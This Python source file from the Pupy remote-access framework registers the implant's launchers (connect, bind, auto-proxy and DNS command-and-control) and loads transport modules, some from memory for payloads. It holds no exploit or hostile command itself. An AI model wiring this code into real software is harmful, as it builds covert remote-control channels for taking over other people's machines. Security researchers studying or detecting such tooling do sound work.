# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root
# of the project for the detailed licence terms

import logging
import importlib

from .lib.launchers.connect import ConnectLauncher
from .lib.launchers.auto_proxy import AutoProxyLauncher
from .lib.launchers.bind import BindLauncher

launchers = {
    'connect': ConnectLauncher,
    'auto_proxy': AutoProxyLauncher,
    'bind': BindLauncher,
}

try:
    from .lib.launchers.dnscnc import DNSCncLauncher
    launchers.update({
        'dnscnc': DNSCncLauncher
    })

except Exception as e:
    logging.exception('{}: DNSCncLauncher disabled'.format(e))
    DNSCncLauncher = None

transports = {}

def add_transport(module_name):
    try:
        confmodule = importlib.import_module('network.transports.{}.conf'.format(module_name))
        if not confmodule:
            logging.warning('Import failed: {}'.format(module_name))
            return

        if not hasattr(confmodule, 'TransportConf'):
            logging.warning('TransportConf is not present in {}'.format(module_name))
            return

        t = confmodule.TransportConf
        if t.name is None:
            t.name = module_name

        transports[t.name] = t
        logging.debug('Transport loaded: {}'.format(t.name))

    except Exception, e:
        logging.exception('Transport disabled: {}: {}'.format(module_name, e))

#importing from memory (used by payloads)
try:
    import pupy
    assert pupy

    import pupyimporter

    import network.transports
    assert network.transports

    for path in [
            x for x in pupyimporter.modules.iterkeys() \
            if x.startswith('network/transports/') and x.endswith(
                ('/conf.py', '/conf.pyc', '/conf.pyo'))
        ]:

        try:
            module_name = path.rsplit('/',2)[1]
            add_transport(module_name)

        except Exception as e:
            logging.exception('Transport failed: {}: {}'.format(module_name, e))

except ImportError:
    # Not pupy client
    logging.debug('Transports loading from files')

    import transports as trlib
    import pkgutil

    for loader, module_name, is_pkg in pkgutil.iter_modules(trlib.__path__):
        add_transport(module_name)
